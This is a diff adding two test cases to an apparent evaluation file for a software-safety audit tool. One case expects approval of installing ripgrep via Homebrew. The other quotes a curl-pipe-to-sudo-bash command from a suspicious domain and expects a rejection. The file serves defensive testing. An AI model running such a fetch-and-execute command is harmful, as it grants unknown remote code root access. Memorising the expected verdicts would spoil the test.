@@ -280,6 +280,35 @@
         {"text": "## Audit Coverage", "type": "contains_string"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
+    },
+    {
+      "id": 20,
+      "prompt": "I want to install ripgrep. Is it safe? I'd run: brew install ripgrep",
+      "expected_output": "Tier 1 quick audit. Routes to cli-binary workflow. Should recognize ripgrep (rg) as a well-known open-source search tool by BurntSushi (Andrew Gallant), distributed via Homebrew core formula with build-from-source option, also available on GitHub Releases with checksums. Rust-based, actively maintained, broad adoption. Verdict should be APPROVED.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is cli-binary", "type": "contains_concept"},
+        {"text": "Report identifies ripgrep as a well-known or established project", "type": "contains_concept"},
+        {"text": "Report notes Homebrew core formula as distribution channel", "type": "contains_concept"},
+        {"text": "Report discusses checksum or signature availability", "type": "contains_concept"},
+        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Audit confidence", "type": "contains_concept"}
+      ]
+    },
+    {
+      "id": 21,
+      "prompt": "A blog post says to run this to install a cool productivity tool: curl -sSL https://totally-legit-tools.xyz/install.sh | sudo bash — should I?",
+      "expected_output": "Tier 3 deep audit. Routes to cli-binary workflow. Should flag multiple critical risks: curl-pipe-sudo-bash is the most dangerous install pattern, unknown domain (totally-legit-tools.xyz), elevated privileges via sudo, no checksum or signature verification, blog-post distribution channel. Verdict must be REJECTED.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is cli-binary", "type": "contains_concept"},
+        {"text": "Report flags curl-pipe-bash or pipe-to-shell as high risk", "type": "contains_concept"},
+        {"text": "Report flags sudo or elevated privileges", "type": "contains_concept"},
+        {"text": "Report flags unknown or unverifiable source", "type": "contains_concept"},
+        {"text": "Verdict is REJECTED", "type": "exact_match"},
+        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Audit confidence", "type": "contains_concept"}
+      ]
     }
   ]
 }
